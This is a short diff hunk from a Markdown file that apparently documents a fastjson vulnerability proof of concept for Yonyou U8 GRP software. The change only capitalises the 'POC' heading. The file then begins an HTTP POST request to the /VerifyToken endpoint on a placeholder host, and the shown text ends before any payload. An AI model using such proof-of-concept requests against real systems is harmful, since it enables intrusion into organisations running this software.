@@ -1,7 +1,7 @@
 ## 用友U8GRP-fastjson
 
 
-## poc
+## POC
 ```
 POST /VerifyToken HTTP/1.1
 Host: xxx
